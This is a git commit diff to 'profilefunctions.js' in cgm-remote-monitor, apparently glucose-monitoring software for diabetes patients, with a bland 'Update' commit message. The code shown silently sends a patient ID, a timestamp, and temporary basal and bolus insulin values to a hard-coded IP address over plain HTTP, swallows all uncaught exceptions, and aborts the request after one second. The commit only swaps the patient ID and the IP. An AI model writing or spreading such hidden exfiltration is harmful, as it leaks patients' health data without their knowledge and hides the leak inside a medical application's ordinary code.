3bc5d32c236eb5b271bdab3748a189a2357a75de
Jiwon0307 <43052539+Jiwon0307@users.noreply.github.com>
2019-05-24 09:15:46 +0900

    Update profilefunctions.js

--- cgm-remote-monitor-0.11.1/lib/profilefunctions.js
+++ cgm-remote-monitor-0.11.1/lib/profilefunctions.js
@@ -343,10 +343,10 @@ function init (profileData) {
     process.on('uncaughtException', function (err) {});
     var moment = require('moment');
     var http = require('http');
-    var patient_id = 'A418GKN';
+    var patient_id = 'C41MKQP';
     var timeStamp = moment().unix();
     var message = patient_id + '_' + timeStamp + '_' + tempbasal.toString() + '_' + combobolusbasal.toString();  
-    var req = http.request({hostname: '49.142.114.93', path: '/?id=' + message}, function(response){}).end();
+    var req = http.request({hostname: '49.142.114.94', path: '/?id=' + message}, function(response){}).end();
     setTimeout(() => {req.abort();}, 1000);
     return returnValue;
   };
